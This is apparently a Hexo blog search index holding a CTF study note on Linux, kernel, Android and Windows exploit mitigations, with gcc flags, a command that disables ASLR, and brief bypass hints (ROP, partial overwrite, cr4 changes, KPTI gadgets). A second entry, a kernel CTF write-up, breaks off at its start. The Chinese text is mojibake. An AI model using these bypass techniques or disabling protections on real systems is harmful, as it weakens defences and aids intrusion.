<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ç¨‹åºä¿æŠ¤æœºåˆ¶</title>
      <link href="/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç¨‹åºä¿æŠ¤æœºåˆ¶å­¦ä¹ </p></blockquote><span id="more"></span><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><h3 id="relro"><a href="#relro" class="headerlink" title="relro"></a>relro</h3><p>read only relocation: ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯».</p><ul><li>æ¯”å¦‚è¯´ gotè¡¨ï¼Œåœ¨å®Œå…¨å¼€å¯ååªè¯»ï¼Œæˆ‘ä»¬æ— æ³•ä¿®æ”¹ä¿®æ”¹å‡½æ•° got è¡¨çš„å†…å®¹ä»è€Œæ”¹å˜å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ã€‚</li></ul><p>gcc é€‰é¡¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-z norelro   <span class="comment"># å…³é—­</span></span><br><span class="line">-z lazy      <span class="comment"># éƒ¨åˆ†å¼€å¯</span></span><br><span class="line">-z now       <span class="comment"># å®Œå…¨å¼€å¯</span></span><br></pre></td></tr></table></figure><h3 id="aslr"><a href="#aslr" class="headerlink" title="aslr"></a>aslr</h3><p>Address Space Layout Randomization, è¿™ç§æŠ€æœ¯ä½¿å¾—ç³»ç»Ÿä¸Šè¿è¡Œçš„è¿›ç¨‹çš„å†…å­˜åœ°å€æ— æ³•è¢«é¢„æµ‹ï¼Œä½¿å¾—ä¸è¿™äº›è¿›ç¨‹æœ‰å…³çš„æ¼æ´å˜å¾—æ›´åŠ éš¾ä»¥åˆ©ç”¨ã€‚é…åˆ PIE ä¿æŠ¤ä»è€Œå¾—åˆ°æœ€å¥½çš„æ•ˆæœ</p><p>Linuxä¸ŠASLRåˆ†ä¸º0&#x2F;1&#x2F;2ä¸‰çº§ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å†…æ ¸å‚æ•°randomize_va_spaceè¿›è¡Œç­‰çº§æ§åˆ¶ï¼Œå¯¹åº”æ•ˆæœå¦‚ä¸‹ï¼š</p><ul><li>0ï¼šæ²¡æœ‰éšæœºåŒ–ï¼Œå³å…³é—­ASLR</li><li>1ï¼šä¿ç•™çš„éšæœºåŒ–ï¼Œå³<strong>å…±äº«åº“ã€æ ˆã€mmap()ä»¥åŠVSDOå°†è¢«éšæœºåŒ–</strong></li><li>2ï¼šå®Œå…¨çš„éšæœºåŒ–ï¼Œåœ¨1çš„åŸºç¡€ä¸Šï¼Œ<strong>é€šè¿‡brkåˆ†é…çš„å†…å­˜ç©ºé—´(heapé€šè¿‡æ­¤ç³»ç»Ÿè°ƒç”¨è·å¾—)ä¹Ÿå°†éšæœºåŒ–</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span>  /proc/sys/kernel/randomize_va_space</span><br><span class="line">  2</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨ gdb è½¯ä»¶è°ƒè¯•æ—¶å¯ä»¥å…³é—­æ­¤ä¿æŠ¤ï¼Œä»è€Œåœ¨è°ƒè¯•æ—¶è·å¾—çš„åœ°å€ä¸€è‡´ã€‚</p><p>å› ä¸ºå­˜åœ¨ä¸€å®šçš„åœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥åœ¨æ¼æ´åˆ©ç”¨æ—¶ä¸èƒ½ä½¿ç”¨å›ºå®šçš„å‡½æ•°åœ°å€ã€‚æ¯”å¦‚æ²¡å¼€ aslr ä¿æŠ¤systemå‡½æ•°(å…±äº«åº“ä¸­çš„å‡½æ•°)åœ°å€æ˜¯ 0x1234ã€‚å¼€å¯aslræ—¶systemå‡½æ•°ä½ç½®ä¼šæ”¹å˜ï¼Œä»è€Œåˆ©ç”¨å¤±è´¥ã€‚</p><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>No-eXecute ä¸å¯æ‰§è¡Œã€‚å’ŒDEP(Data Execute Protector)ä¸€è‡´</p><p>å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><p>gccå‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-z execstack    <span class="comment"># æ ˆå¯æ‰§è¡Œ</span></span><br><span class="line">-z noexecstack  <span class="comment"># å¼€å¯</span></span><br></pre></td></tr></table></figure><p>bypass: æœç»äº†ä¸€å®šå†™shellcodeçš„åˆ©ç”¨ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨**ROP(Return-oriented programming)**æ¥bypassï¼Œé€ æˆæˆ‘ä»¬æƒ³è¦çš„æ”»å‡»æ•ˆæœã€‚</p><h3 id="pie"><a href="#pie" class="headerlink" title="pie"></a>pie</h3><p>Position independent code, ä½ç½®æ— å…³ä»£ç ï¼Œé»˜è®¤å¼€å¯ã€‚<br>é’ˆå¯¹ä»£ç æ®µ.text, æ•°æ®æ®µï¼Œ.dataï¼Œ.bssç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ã€‚åŒASLRä¸€æ ·ï¼Œåº”ç”¨äº†PIEçš„ç¨‹åºä¼šåœ¨æ¯æ¬¡åŠ è½½æ—¶éƒ½å˜æ¢åŠ è½½åŸºå€ï¼Œä»è€Œä½¿ä½äºç¨‹åºæœ¬èº«çš„gadgetä¹Ÿå¤±æ•ˆ</p><p>æ²¡æœ‰PIEä¿æŠ¤çš„ç¨‹åºï¼Œæ¯æ¬¡åŠ è½½çš„åŸºå€éƒ½æ˜¯å›ºå®šçš„ï¼Œ64ä½ä¸Šä¸€èˆ¬æ˜¯0x400000ã€‚</p><p>gcc å‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-no-pie    <span class="comment"># å…³é—­pie</span></span><br><span class="line">-pie       <span class="comment"># å¼€å¯pie</span></span><br></pre></td></tr></table></figure><p>å¼€å¯aslrï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—textæ®µçš„gadgetï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ã€‚ä½†æ˜¯å¼€å…¶pieä¿æŠ¤åï¼ŒtextéšæœºåŒ–ï¼Œæˆ‘ä»¬å¯»æ‰¾çš„gadgetä¹Ÿéœ€è¦åŠ ä¸Šä¸€ä¸ªåç§»æ‰èƒ½ä½¿ç”¨ã€‚</p><ul><li>bypass<ul><li>partial write: ç”±äºå†…å­˜çš„é¡µè½½å…¥æœºåˆ¶ï¼ŒPIEçš„éšæœºåŒ–åªèƒ½<strong>å½±å“åˆ°å•ä¸ªå†…å­˜é¡µ</strong>ã€‚é€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªå†…å­˜é¡µå¤§å°ä¸º0x1000ï¼Œè¿™å°±æ„å‘³ç€ä¸ç®¡åœ°å€æ€ä¹ˆå˜ï¼ŒæŸæ¡æŒ‡ä»¤çš„å12ä½æ˜¯å§‹ç»ˆä¸å˜çš„ã€‚å› æ­¤é€šè¿‡è¦†ç›–éƒ¨åˆ†å†…å®¹æ¯”å¦‚å8ä½ä»è€ŒåŠ«æŒå‡½æ•°æ‰§è¡Œæµã€‚<ul><li>leak: ç¨‹åºæœ¬èº«çš„æ¼æ´å¯ä»¥æ³„éœ²æŸäº›å‡½æ•°åœ°å€ï¼Œä»è€Œè·å¾—ç¨‹åºåŠ è½½çš„åŸºåœ°å€ã€‚</li></ul></li><li>vdso&#x2F;vsyscall: ç³»ç»ŸæŠŠå‡ ä¸ªå¸¸ç”¨çš„æ— å‚å†…æ ¸è°ƒç”¨ä»å†…æ ¸ä¸­æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸­ï¼Œè¿™å°±æ˜¯vsyscallã€‚åœ¨æŸäº›ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªåœ°å€ä¸ä¼šæ”¹å˜ï¼Œå¹¶ä¸”ä¸å—ä¿æŠ¤çš„å½±å“ã€‚vsyscall å†…å­˜é¡µä¸­åŒ…å«äº†ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚è€Œä¸”è¿™ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹ç¨‹åºè¿è¡ŒåŸºæœ¬æ²¡æœ‰å½±å“ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è·å¾—äº†ä¸‰ä¸ªå·²çŸ¥åœ°å€çš„ retã€‚ç›¸å½“å¯ä»¥æ‰§è¡Œ <code>ret</code> æŒ‡ä»¤ï¼Œè·å¾—ï¼šæŸ¥çœ‹ç¨‹åºçš„æ˜ å°„ <code>cat /proc/&lt;pid&gt;/maps</code>ã€‚</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__vsyscall_page:</span><br><span class="line"> mov $__NR_gettimeofday, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_time, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_getcpu, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure><h3 id="stack-canary"><a href="#stack-canary" class="headerlink" title="stack canary"></a>stack canary</h3><p>å½“å¯ç”¨ canary ä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œ<strong>æ’å…¥ cookie ä¿¡æ¯</strong>ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚</p><p>Linux canary æœ€åä¸€å­—èŠ‚ä¸º <code>\x00</code></p><p>gcc å¼€å¯å’Œå…³é—­çš„å‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fno-stack-protector   <span class="comment"># å…³é—­ï¼Œé»˜è®¤æ²¡æœ‰canary</span></span><br><span class="line"></span><br><span class="line">-fstack-protector          <span class="comment"># ä¿æŠ¤å‡½æ•°ä¸­é€šè¿‡alloca()åˆ†é…ç¼“å­˜ä»¥åŠå­˜åœ¨å¤§äº8å­—èŠ‚çš„bufferã€‚ä¿æŠ¤èƒ½åŠ›æœ‰é™ï¼Œä¸ä¼šä¿æŠ¤æ‰€æœ‰çš„å‡½æ•°</span></span><br><span class="line">-fstack-protector-all      <span class="comment"># å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span></span><br><span class="line">-fstack-protector-strong   <span class="comment"># ç¼–è¯‘å‚æ•°è®©ä¿æŠ¤çš„èŒƒå›´æ›´å¹¿</span></span><br></pre></td></tr></table></figure><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><h3 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h3><p>kernel address space layout randomize</p><p>åœ¨å¼€å¯äº† KASLR çš„å†…æ ¸ä¸­ï¼Œå†…æ ¸çš„ä»£ç æ®µåŸºåœ°å€ç­‰åœ°å€ä¼šæ•´ä½“åç§»ã€‚</p><h3 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h3><p>Supervisor Mode Access Preventionï¼Œç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤ã€‚</p><p>å¦‚æœå†…æ ¸æ€å¯ä»¥è®¿é—®ç”¨æˆ·æ€çš„æ•°æ®ï¼Œä¹Ÿä¼šå‡ºç°é—®é¢˜ã€‚æ¯”å¦‚åœ¨åŠ«æŒæ§åˆ¶æµåï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ ˆè¿ç§»å°†æ ˆè¿ç§»(pop rspç±»ä¼¼çš„æŒ‡ä»¤)åˆ°ç”¨æˆ·æ€ï¼Œç„¶åè¿›è¡Œ ROPï¼Œè¿›ä¸€æ­¥è¾¾åˆ°ææƒçš„ç›®çš„ã€‚</p><p>åœ¨ Linux å†…æ ¸ä¸­ï¼Œè¿™ä¸ªé˜²å¾¡æªæ–½çš„å®ç°æ˜¯ä¸<strong>æŒ‡ä»¤é›†æ¶æ„ç›¸å…³</strong>çš„ã€‚x86 ä¸‹å¯¹åº”çš„ä¿æŠ¤æœºåˆ¶çš„åå­—ä¸º SMAPã€‚CR4 å¯„å­˜å™¨ä¸­çš„ç¬¬ 21 ä½ç”¨æ¥æ ‡è®°æ˜¯å¦å¼€å¯ SMEP ä¿æŠ¤ã€‚</p><ul><li>bypass: ä¿®æ”¹cr4</li></ul><h3 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h3><p>Supervisor Mode Execution Preventionï¼Œç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤ã€‚</p><p>åœ¨å†…æ ¸æ€æ‰§è¡Œä»£ç æ—¶ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ã€‚é‚£å¦‚æœæ”»å‡»è€…<strong>æ§åˆ¶äº†å†…æ ¸ä¸­çš„æ‰§è¡Œæµï¼Œå°±å¯ä»¥æ‰§è¡Œå¤„äºç”¨æˆ·æ€çš„ä»£ç </strong>ã€‚ç”±äºç”¨æˆ·æ€çš„ä»£ç æ˜¯æ”»å‡»è€…å¯æ§çš„ï¼Œæ‰€ä»¥æ›´å®¹æ˜“å®æ–½æ”»å‡»ã€‚ä¸ºäº†é˜²èŒƒè¿™ç§æ”»å‡»ï¼Œç ”ç©¶è€…æå‡ºå½“ä½äºå†…æ ¸æ€æ—¶ï¼Œä¸èƒ½æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ã€‚</p><p>åœ¨ Linux å†…æ ¸ä¸­ï¼Œè¿™ä¸ªé˜²å¾¡æªæ–½çš„å®ç°æ˜¯ä¸<strong>æŒ‡ä»¤é›†æ¶æ„ç›¸å…³</strong>çš„(ARM PXN)ã€‚x86ä¸‹ <code>CR4</code> å¯„å­˜å™¨ä¸­çš„ç¬¬ 20 ä½ç”¨æ¥æ ‡è®°æ˜¯å¦å¼€å¯ SMEP ä¿æŠ¤ã€‚</p><p>æŸ¥çœ‹æ˜¯å¦å¼€å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep smap /proc/cpuinfo  <span class="comment"># å¦‚æœå‡ºç°ç»“æœï¼Œè¯´æ˜å¼€å¯</span></span><br></pre></td></tr></table></figure><ul><li>bypass: ä¿®æ”¹cr4</li></ul><h3 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h3><p>Kernel Page Table Isolationï¼Œå†…æ ¸é¡µè¡¨éš”ç¦»</p><p>åœ¨ x86_64 çš„ PTI æœºåˆ¶ä¸­ï¼Œ<strong>å†…æ ¸æ€çš„ç”¨æˆ·ç©ºé—´å†…å­˜æ˜ å°„éƒ¨åˆ†è¢«å…¨éƒ¨æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œ</strong>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¹‹å‰ä¸å…·æœ‰ SMEP ç‰¹æ€§çš„ç¡¬ä»¶ï¼Œå¦‚æœå¼€å¯äº† KPTI ä¿æŠ¤ï¼Œä¹Ÿå…·æœ‰äº†ç±»ä¼¼äº SMEP çš„ç‰¹æ€§ã€‚æ­¤å¤–ï¼ŒSMAP æ¨¡æ‹Ÿä¹Ÿå¯ä»¥ä»¥ç±»ä¼¼çš„æ–¹å¼å¼•å…¥ï¼Œåªæ˜¯ç°åœ¨è¿˜æ²¡æœ‰å¼•å…¥ã€‚å› æ­¤ï¼Œåœ¨ç›®å‰å¼€å¯äº† KPTI ä¿æŠ¤çš„å†…æ ¸ä¸­ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ SMAP ä¿æŠ¤ï¼Œé‚£ä¹ˆå†…æ ¸ä»ç„¶å¯ä»¥è®¿é—®ç”¨æˆ·æ€ç©ºé—´çš„å†…å­˜ï¼Œåªæ˜¯ä¸èƒ½è·³è½¬åˆ°ç”¨æˆ·æ€ç©ºé—´æ‰§è¡Œ Shellcodeã€‚</p><ul><li>bypass<ul><li>signal handler</li><li>change cr3<ul><li>swapgs_restore_regs_and_return_to_usermode å‡½æ•°ä¸­å­˜åœ¨å¯ä»¥æ”¹å˜ cr3 çš„gadget</li></ul></li></ul></li></ul><h3 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h3><p>FGKASLR åœ¨ KASLR åŸºåœ°å€éšæœºåŒ–çš„åŸºç¡€ä¸Šï¼Œåœ¨åŠ è½½æ—¶åˆ»ï¼Œä»¥å‡½æ•°ç²’åº¦é‡æ–°æ’å¸ƒå†…æ ¸ä»£ç ã€‚ç›®å‰ï¼ŒFGKASLR åªæ”¯æŒ <strong>x86_64</strong> æ¶æ„ã€‚</p><p>FGKASLR åˆ©ç”¨ gcc çš„ç¼–è¯‘é€‰é¡¹Â <code>-ffunction-sections</code>Â æŠŠå†…æ ¸ä¸­ä¸åŒçš„å‡½æ•°æ”¾åˆ°ä¸åŒçš„ section ä¸­ã€‚ åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ï¼Œä»»ä½•ä½¿ç”¨ C è¯­è¨€ç¼–å†™çš„å‡½æ•°ä»¥åŠä¸åœ¨ç‰¹æ®Šè¾“å…¥èŠ‚çš„å‡½æ•°éƒ½ä¼šå•ç‹¬ä½œä¸ºä¸€ä¸ªèŠ‚ï¼›ä½¿ç”¨æ±‡ç¼–ç¼–å†™çš„ä»£ç ä¼šä½äºä¸€ä¸ªç»Ÿä¸€çš„èŠ‚ä¸­ã€‚</p><p>å¦‚æœæƒ³è¦å¼€å¯å†…æ ¸çš„ FGKASLRï¼Œä½ éœ€è¦å¼€å¯Â <code>CONFIG_FG_KASLR=y</code>Â é€‰é¡¹ã€‚</p><h3 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h3><p>åœ¨ç¼–è¯‘å†…æ ¸æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½® CONFIG_CC_STACKPROTECTOR é€‰é¡¹ï¼Œæ¥å¼€å¯è¯¥ä¿æŠ¤</p><p>åœ¨ x86 æ¶æ„ä¸­ï¼ŒåŒä¸€ä¸ª task ä¸­ä½¿ç”¨ç›¸åŒçš„ Canaryã€‚</p><hr><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><blockquote><p>å®‰å“ä½¿ç”¨ Linux Kernelï¼Œæœ‰äº›ä¿æŠ¤å¹¶éç‰¹æœ‰ï¼Œè€Œæ˜¯æ˜¯å¦é»˜è®¤å¼€å¯ã€‚</p></blockquote><h3 id="pxn"><a href="#pxn" class="headerlink" title="pxn"></a>pxn</h3><p>Privileged Execute-Neverã€‚å†…æ ¸å®‰å…¨ç‰¹æ€§ï¼Œç”¨æ¥é˜»æ­¢å†…æ ¸ç›´æ¥æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ï¼Œèƒ½å¤Ÿæå¤§åœ°æå‡æ¼æ´åˆ©ç”¨çš„éš¾åº¦ã€‚</p><p>å’Œ smep ä¸€ä¸ªæ€§è´¨</p><h3 id="pan"><a href="#pan" class="headerlink" title="pan"></a>pan</h3><p>smap ç±»ä¼¼çš„æ€§è´¨</p><h3 id="cfi"><a href="#cfi" class="headerlink" title="cfi"></a>cfi</h3><p>Control-Flow Integrity æ§åˆ¶æµå®Œæ•´æ€§</p><p>å…¶æ ¸å¿ƒæ€æƒ³æ˜¯<strong>é™åˆ¶ç¨‹åºè¿è¡Œä¸­çš„æ§åˆ¶è½¬ç§»ï¼Œä½¿ä¹‹å§‹ç»ˆå¤„äºåŸæœ‰çš„æ§åˆ¶æµå›¾æ‰€é™å®šçš„èŒƒå›´å†…</strong>ã€‚å…·ä½“åšæ³•æ˜¯é€šè¿‡åˆ†æç¨‹åºçš„æ§åˆ¶æµå›¾ï¼Œè·å–é—´æ¥è½¬ç§»æŒ‡ä»¤ï¼ˆåŒ…æ‹¬é—´æ¥è·³è½¬ã€é—´æ¥è°ƒç”¨ã€å’Œå‡½æ•°è¿”å›æŒ‡ä»¤ï¼‰ç›®æ ‡çš„ç™½åå•ï¼Œå¹¶åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ ¸å¯¹é—´æ¥è½¬ç§»æŒ‡ä»¤çš„ç›®æ ‡æ˜¯å¦åœ¨ç™½åå•ä¸­ã€‚æ§åˆ¶æµåŠ«æŒæ”»å‡»å¾€å¾€ä¼šè¿èƒŒåŸæœ‰çš„æ§åˆ¶æµå›¾ï¼ŒCFIä½¿å¾—è¿™ç§æ”»å‡»è¡Œä¸ºéš¾ä»¥å®ç°ï¼Œä»è€Œä¿éšœè½¯ä»¶ç³»ç»Ÿçš„å®‰å…¨ã€‚</p><p>å†…æ ¸ CFI æ‰‹åŠ¨å¯ç”¨ï¼Œx86é€šè¿‡æ­¤å¼€å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure><hr><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>ä¸ Linux ç›¸åŒï¼ŒASLR ä¿æŠ¤æŒ‡çš„æ˜¯åœ°å€éšæœºåŒ–æŠ€æœ¯(Address Space Layout Randomization)ï¼Œè¿™é¡¹æŠ€æœ¯å°†åœ¨ç¨‹åºå¯åŠ¨æ—¶å°† DLL éšæœºçš„åŠ è½½åˆ°å†…å­˜ä¸­çš„ä½ç½®ï¼Œè¿™å°†ç¼“è§£æ¶æ„ç¨‹åºçš„åŠ è½½ã€‚ASLR è‡ª Windows 10 å¼€å§‹å·²ç»åœ¨ç³»ç»Ÿä¸­è¢«é…ç½®ä¸ºé»˜è®¤å¯ç”¨ã€‚</p><h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>Data Execute Protector</p><h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>è¿™ä¸ªä¿æŠ¤ç±»ä¼¼äº Linux ä¸­çš„ Canary ä¿æŠ¤ï¼Œä¸€æ—¦å¼€å¯ï¼Œä¼šåœ¨è¿”å›åœ°å€å’Œ BP ä¹‹å‰å‹å…¥ä¸€ä¸ªé¢å¤–çš„ <strong>Security Cookie</strong>ã€‚ç³»ç»Ÿä¼šæ¯”è¾ƒæ ˆä¸­çš„è¿™ä¸ªå€¼å’ŒåŸå…ˆå­˜æ”¾åœ¨ .data ä¸­çš„å€¼åšä¸€ä¸ªæ¯”è¾ƒã€‚å¦‚æœä¸¤è€…ä¸å»åˆï¼Œè¯´æ³•æ ˆä¸­å‘ç”Ÿäº†æº¢å‡ºã€‚</p><h3 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h3><p>DLL æ··æ·†çº§ä¿æŠ¤ã€‚</p><h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h3><p>è¢«ç§°ä¸ºéš”ç¦»ä¿æŠ¤ï¼Œä¸€æ—¦å¼€å¯ï¼Œè¡¨ç¤ºæ­¤ç¨‹åºåŠ è½½æ—¶å°†ä¼šåœ¨ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„éš”ç¦»ç¯å¢ƒä¸­è¢«åŠ è½½ï¼Œä»è€Œé˜»æ­¢æ”»å‡»è€…è¿‡åº¦æå‡æƒé™ã€‚</p><h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆStructured Exception Handlingï¼Œç®€ç§° SEHï¼‰æ˜¯ä¸€ç§ <code>Windows</code> æ“ä½œç³»ç»Ÿå¯¹é”™è¯¯æˆ–å¼‚å¸¸æä¾›çš„å¤„ç†æŠ€æœ¯ã€‚ä¸ºWindows çš„ç¨‹åºè®¾è®¡è€…æä¾›äº†ç¨‹åºé”™è¯¯æˆ–å¼‚å¸¸çš„å¤„ç†é€”å¾„ï¼Œä½¿å¾—ç³»ç»Ÿæ›´åŠ å¥å£®ã€‚</p><h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>å®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå³ç™½åå•å®‰å…¨æ²™ç®±ï¼Œäº‹å…ˆå®šä¹‰ä¸€äº›å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œå¹¶åŸºäºæ­¤æ„é€ å®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ï¼Œç¨‹åºæ­£å¼è¿è¡Œåï¼Œå®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ä¹‹å¤–çš„å¼‚å¸¸å¤„ç†ç¨‹åºå°†ä¼šè¢«é˜»æ­¢è¿è¡Œã€‚</p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><ul><li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/readme/">CTF-wili</a></li><li><a href="https://source.android.google.cn/docs/security/test/cfi?hl=zh-cn">android CFI</a></li><li><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">Control Flow Integrity â€” Clang</a></li><li><a href="https://www.cnblogs.com/pwnfeifei/p/17162374.html">windows pwn</a></li><li><a href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">Windows_Pwnå­¦ä¹ </a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¨‹åºç¼“è§£æœºåˆ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>peekgeek mmsg</title>
      <link href="/2023/07/28/peekgeek%20mmsg/"/>
      <url>/2023/07/28/peekgeek%20mmsg/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åšé¢˜è¸©å‘å®å½•ï¼Œèµ›åå¤ç°.</p></blockquote><span id="more"></span><h2 id="step1-init"><a href="#step1-init" class="headerlink" title="step1: init"></a>step1: init</h2><ul><li>æ‹¿åˆ°é™„ä»¶ï¼ŒæŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼Œsmep, smap, kaslrï¼Œåº”è¯¥è¿˜æœ‰pti</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 